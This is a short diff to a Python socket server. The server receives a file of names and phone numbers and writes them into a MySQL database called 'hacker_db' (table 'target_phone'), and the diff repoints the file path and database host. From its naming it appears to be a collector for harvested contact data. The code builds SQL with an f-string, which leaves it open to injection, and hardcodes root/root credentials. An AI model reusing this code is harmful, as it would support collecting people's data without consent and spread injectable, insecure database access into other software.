@@ -33,7 +33,7 @@ def receive_file(sck: socket.socket, filename):
                     f.write(chunk)
                     received_bytes += len(chunk)
         time.sleep(1)
-        with open('recieved.txt', 'r') as file:
+        with open('/server/recieved.txt', 'r') as file:
             for line in file:
                 insert_data = line.split(' ')
                 insert_to_db(insert_data[0], insert_data[1])
@@ -45,7 +45,7 @@ def receive_file(sck: socket.socket, filename):
         print('Data recieved!')
 
 def insert_to_db(name, number) -> None:
-    db = pymysql.connect(host='127.0.0.1', user='root', passwd='root', db='hacker_db')
+    db = pymysql.connect(host='172.16.1.100', user='root', passwd='root', db='hacker_db')
     cursor = db.cursor()
     sql = f"INSERT INTO target_phone (name, number) values ('{name}', '{number}')"
     cursor.execute(sql)
@@ -60,7 +60,6 @@ if(__name__ == '__main__'):
                 conn, address = server.accept()
                 print(f"{address[0]}:{address[1]} connected.")
                 receive_file(conn, "recieved.txt")
-
         print("Connecetion closed.")
     except KeyboardInterrupt:
         print('CTRL+C Detected. Exiting')
